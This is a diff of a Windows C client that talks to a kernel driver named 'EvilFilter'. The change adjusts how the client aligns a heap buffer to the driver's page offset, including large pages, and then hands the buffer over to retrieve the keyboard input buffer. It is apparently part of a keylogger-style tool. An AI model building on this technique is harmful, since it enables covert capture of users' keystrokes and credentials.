@@ -89,23 +89,27 @@ int main(int argc, _TCHAR* argv[]) {
 		else {
 			ULONG kmdfOffset;
 			ULONG keyboardOffset;
-			PVOID ppde;
-			PVOID ppte;
 			PLLIST listNode;
 
 			kmdfOffset = dataToTransmit->offset;
+			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
 			keyboardOffset = (ULONG)keyboardData & 0x0fff;
-			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
-			keyboardOffset = (ULONG)keyboardData & 0x0fff;
-			printf("keyboardData is [0x%lx] offset is [0x%lx].\n", keyboardData, keyboardOffset);
-
+			if (dataToTransmit->largePage) {
+				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
+			}
+			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
 			// create a pointer with the correct offset
 			listNode = (PLLIST)malloc(sizeof(LLIST));
 			listNode->keyboardBuffer = keyboardData;
 			listNode->previous = NULL;
 			while (keyboardOffset != kmdfOffset) {
 				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
-				keyboardOffset = (ULONG)keyboardData & 0x0fff;
+				if (dataToTransmit->largePage) {
+					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
+				}
+				else {
+					keyboardOffset = (ULONG)keyboardData & 0xfff;
+				}
 				PLLIST previousListNode = listNode;
 				listNode = (PLLIST)malloc(sizeof(LLIST));
 				listNode->keyboardBuffer = keyboardData;
@@ -121,13 +125,7 @@ int main(int argc, _TCHAR* argv[]) {
 				}
 				free(currentListNode);
 			}
-			ppde = GetPdeAddress(keyboardData);
-			ppte = GetPteAddress(keyboardData);
-			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);
-
 			dataToTransmit->ClientMemory = keyboardData;
-			dataToTransmit->PageDirectory = ppde;
-			dataToTransmit->PageTable = ppte;
 			dataToTransmit->instruction = 'E';
 
 			// Get the Keyboard Buffer
